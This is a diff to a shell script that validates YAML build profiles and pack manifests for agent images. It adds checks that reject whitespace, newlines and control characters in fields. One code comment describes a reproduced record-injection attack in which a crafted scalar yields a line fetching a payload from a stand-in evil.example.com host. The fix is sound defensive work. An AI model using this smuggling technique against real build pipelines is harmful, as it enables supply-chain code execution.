@@ -62,6 +62,33 @@ require_scalar() {
   printf '%s' "$val"
 }
 
+# EVERY FIELD THAT BECOMES PART OF A WHITESPACE-DELIMITED RECORD GOES THROUGH THIS.
+# A Codex adversarial pass broke the previous form: the plan files are space-delimited
+# and pack-install.sh re-splits them with `read -r name version sha`, but nothing stopped
+# a scalar from CONTAINING whitespace or a newline. A single YAML block scalar in one
+# `version` or `url` therefore emitted a SECOND well-formed record that the writer never
+# intended -- and that injected record was never seen by require_https or by the
+# archive-name allowlist, because those ran against the original field. Reproduced before
+# fixing: a manifest declaring one archive emitted
+# `totally-unknown-archive 0.0.1 http://plaintext.evil.example.com/payload.tar.gz <sha>`,
+# past BOTH checks. With the name `node` or `go` and a matching checksum that is arbitrary
+# code in every agent image, from a manifest that reads as declaring one entry.
+#
+# This is the SF-3 lesson repeating a second time in this feature: introducing an internal
+# encoding retroactively makes every value flowing into it security-relevant, including
+# values that were harmless under the previous representation.
+require_token() {
+  local v="$1" what="$2"
+  case "$v" in
+    *[[:space:]]*) die "$what must not contain whitespace or newlines (got '$(printf '%s' "$v" | tr '\n' '~')')" ;;
+  esac
+  if printf '%s' "$v" | LC_ALL=C grep -q '[[:cntrl:]]'; then
+    die "$what must not contain control characters"
+  fi
+  [ -n "$v" ] || die "$what is empty"
+  printf '%s' "$v"
+}
+
 require_sha256() {
   local v="$1" what="$2"
   printf '%s' "$v" | grep -Eq '^[0-9a-f]{64}$' \
@@ -81,16 +108,46 @@ mkdir -p "$OUT"
 : > "$OUT/archives.txt"
 : > "$OUT/packs.txt"
 
+# --- the pack list -------------------------------------------------------------
+# Read FIRST, because whether a repository is required depends on it.
+require_tag '.packs' "$PROFILE_FILE" '!!seq' 'packs'
+
+# EACH ENTRY IS TAG-CHECKED, not only the sequence. yq renders the YAML scalars `true`,
+# `null` and `0755` as the plain text "true", "null" and "0755", every one of which
+# satisfies the name regex below -- so a boolean or an all-digit entry would be used to
+# build a directory path. scripts/compile-policy.sh already refuses YAML-ambiguous pack
+# names at the producer; this is the second reader catching up with it.
+pack_count="$(yq -r '.packs | length' "$PROFILE_FILE")"
+i=0
+while [ "$i" -lt "$pack_count" ]; do
+  require_tag ".packs[$i]" "$PROFILE_FILE" '!!str' "packs[$i]"
+  i=$((i + 1))
+done
+
+mapfile -t PACK_NAMES < <(yq -r '.packs[]' "$PROFILE_FILE")
+
+# A ZERO-PACK PROFILE NEEDS NO REPOSITORY, and demanding one contradicted the schema's
+# own contract. profiles/default.yaml states it in as many words -- "Required only when
+# `packs` above is non-empty" -- but this script asserted the block unconditionally, so
+# `--build-arg PROFILE=test-selfcheck` died at "package_repository.apt must be !!map,
+# found !!null" on a profile that is CORRECT as written and deliberately omits it. Found
+# by a Codex adversarial pass and reproduced before fixing.
+if [ "${#PACK_NAMES[@]}" -eq 0 ]; then
+  : > "$OUT/repo.env"
+  echo "pack-plan: profile '$PROFILE' selects no packs; no package repository required"
+  exit 0
+fi
+
 # --- the repository the apt items come from (R7.18, Contract 2) ----------------
-# Required whenever the profile selects any pack. A snapshot, not a suite: the
+# Reached only when the profile selects at least one pack. A snapshot, not a suite: the
 # timestamped URL is stable in time where `suite: bookworm` plus name=version
 # resolves today and fails after the next archive rotation (Edge Case 8).
 require_tag '.package_repository.apt' "$PROFILE_FILE" '!!map' 'package_repository.apt'
 
-APT_URL="$(require_scalar '.package_repository.apt.url' "$PROFILE_FILE" 'package_repository.apt.url')"
-APT_SUITE="$(require_scalar '.package_repository.apt.suite' "$PROFILE_FILE" 'package_repository.apt.suite')"
-APT_SIGNED_BY="$(require_scalar '.package_repository.apt.signed_by' "$PROFILE_FILE" 'package_repository.apt.signed_by')"
-APT_FPR="$(require_scalar '.package_repository.apt.fingerprint' "$PROFILE_FILE" 'package_repository.apt.fingerprint')"
+APT_URL="$(require_token "$(require_scalar '.package_repository.apt.url' "$PROFILE_FILE" 'package_repository.apt.url')" 'package_repository.apt.url')"
+APT_SUITE="$(require_token "$(require_scalar '.package_repository.apt.suite' "$PROFILE_FILE" 'package_repository.apt.suite')" 'package_repository.apt.suite')"
+APT_SIGNED_BY="$(require_token "$(require_scalar '.package_repository.apt.signed_by' "$PROFILE_FILE" 'package_repository.apt.signed_by')" 'package_repository.apt.signed_by')"
+APT_FPR="$(require_token "$(require_scalar '.package_repository.apt.fingerprint' "$PROFILE_FILE" 'package_repository.apt.fingerprint')" 'package_repository.apt.fingerprint')"
 
 require_https "$APT_URL" 'package_repository.apt.url'
 printf '%s' "$APT_FPR" | grep -Eq '^[0-9A-F]{40}$' \
@@ -110,10 +167,6 @@ esac
   printf 'APT_FINGERPRINT=%s\n' "$APT_FPR"
 } > "$OUT/repo.env"
 
-# --- the pack list -------------------------------------------------------------
-require_tag '.packs' "$PROFILE_FILE" '!!seq' 'packs'
-mapfile -t PACK_NAMES < <(yq -r '.packs[]' "$PROFILE_FILE")
-
 seen_packs=""
 seen_archives=""
 seen_apt=""
@@ -132,7 +185,7 @@ for name in "${PACK_NAMES[@]+"${PACK_NAMES[@]}"}"; do
 
   # The manifest must name itself, or a directory rename silently installs the
   # wrong set under the right name.
-  mf_name="$(require_scalar '.name' "$MF" 'name')"
+  mf_name="$(require_token "$(require_scalar '.name' "$MF" 'name')" "name in packs/$name/pack.yaml")"
   [ "$mf_name" = "$name" ] \
     || die "pack directory '$name' holds a manifest named '$mf_name'"
 
@@ -148,9 +201,9 @@ for name in "${PACK_NAMES[@]+"${PACK_NAMES[@]}"}"; do
     while [ "$i" -lt "$n" ]; do
       p=".packages.apt.items[$i]"
       require_tag "$p" "$MF" '!!map' "packages.apt.items[$i]"
-      pn="$(require_scalar "$p.name"    "$MF" "packages.apt.items[$i].name")"
-      pv="$(require_scalar "$p.version" "$MF" "packages.apt.items[$i].version")"
-      ps="$(require_scalar "$p.sha256"  "$MF" "packages.apt.items[$i].sha256")"
+      pn="$(require_token "$(require_scalar "$p.name"    "$MF" "packages.apt.items[$i].name")"    "packages.apt.items[$i].name in $name")"
+      pv="$(require_token "$(require_scalar "$p.version" "$MF" "packages.apt.items[$i].version")" "packages.apt.items[$i].version in $name")"
+      ps="$(require_token "$(require_scalar "$p.sha256"  "$MF" "packages.apt.items[$i].sha256")"  "packages.apt.items[$i].sha256 in $name")"
       require_sha256 "$ps" "packages.apt.items[$i].sha256 in $name"
       case " $seen_apt " in
         *" $pn "*) die "apt package '$pn' is declared by more than one selected pack" ;;
@@ -170,10 +223,10 @@ for name in "${PACK_NAMES[@]+"${PACK_NAMES[@]}"}"; do
     while [ "$i" -lt "$n" ]; do
       p=".packages.archives[$i]"
       require_tag "$p" "$MF" '!!map' "packages.archives[$i]"
-      an="$(require_scalar "$p.name"    "$MF" "packages.archives[$i].name")"
-      av="$(require_scalar "$p.version" "$MF" "packages.archives[$i].version")"
-      au="$(require_scalar "$p.url"     "$MF" "packages.archives[$i].url")"
-      as="$(require_scalar "$p.sha256"  "$MF" "packages.archives[$i].sha256")"
+      an="$(require_token "$(require_scalar "$p.name"    "$MF" "packages.archives[$i].name")"    "packages.archives[$i].name in $name")"
+      av="$(require_token "$(require_scalar "$p.version" "$MF" "packages.archives[$i].version")" "packages.archives[$i].version in $name")"
+      au="$(require_token "$(require_scalar "$p.url"     "$MF" "packages.archives[$i].url")"     "packages.archives[$i].url in $name")"
+      as="$(require_token "$(require_scalar "$p.sha256"  "$MF" "packages.archives[$i].sha256")"  "packages.archives[$i].sha256 in $name")"
       require_https "$au" "packages.archives[$i].url in $name"
       require_sha256 "$as" "packages.archives[$i].sha256 in $name"
       # Two packs supplying the same archive at different versions would install
